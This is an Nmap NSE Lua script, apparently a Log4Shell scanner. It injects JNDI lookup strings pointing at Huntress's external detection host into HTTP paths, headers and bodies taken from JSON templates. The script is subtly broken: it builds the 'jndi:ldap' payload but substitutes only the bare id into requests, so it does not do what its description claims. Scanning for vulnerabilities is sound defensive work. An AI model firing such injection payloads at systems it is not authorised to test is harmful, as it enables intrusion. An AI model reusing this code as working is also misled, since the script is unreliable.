local nmap = require "nmap"
local http = require "http"
local shortport = require "shortport"
local json = require "json"
local stdnse = require "stdnse"
local string = require "string"
local open = io.open

description = [[
  Injects a Huntress log4shell payload in HTTP requests described by JSON templates.
  Results expire after 30 minutes.
  
  References:
    - https://log4shell.huntress.com/
]]

author = "Luciano Righetti"
license = "GPLv3"
categories = {"discovery", "exploit"}

portrule = shortport.http

local function read_templates(path)
    local file = open(path, "r")
    if not file then return nil end
    local content = file:read "*a"
    _, templates = json.parse(content)
    file:close()
    return templates
end

action = function(host, port)

    -- huntress recon id
    if stdnse.get_script_args("id") == nil then
        return "ERROR: missing Huntress id, grab the uuid from https://log4shell.huntress.com/ and add --script-args id=<uuid>."
    end
    local id = stdnse.get_script_args("id")

    -- Hunters payload
    local payload = ("${jndi:ldap://log4shell.huntress.com:1389/%s}"):format(id)

    -- load injection templates
    local templates_path = stdnse.get_script_args("templates") or "templates.json"
    local templates = read_templates(templates_path)

    -- send requests
    for _, t in ipairs(templates) do
        
        -- default http options
        local options = {
            bypass_cache = true,
            no_cache = true,
            header = {}
        }

        -- build method
        local method = t["method"] or "GET"
        
        -- build path / query strings
        local path = t["path"] or "/";
        path = string.gsub(path, "{payload}", id)
        
        -- build headers
        if t["headers"] ~= nil then
            for _, h in ipairs(t["headers"]) do
                options["header"][h["name"]] = string.gsub(h["format"], "{payload}", id)
            end
        end
        
        -- build body
        if t["body"] ~= nil then
            options["content"] = string.gsub(t["body"], "{payload}", id)
        end
        
        stdnse.debug1("[*] Sending request to %s with tempate id=%s", host.targetname or host.ip, t["id"])
        http.generic_request(
            host.targetname or host.ip, 
            port,
            method,
            path,
            options
        )
    
    end

    return ("Check https://log4shell.huntress.com/view/%s for results."):format(id)
end
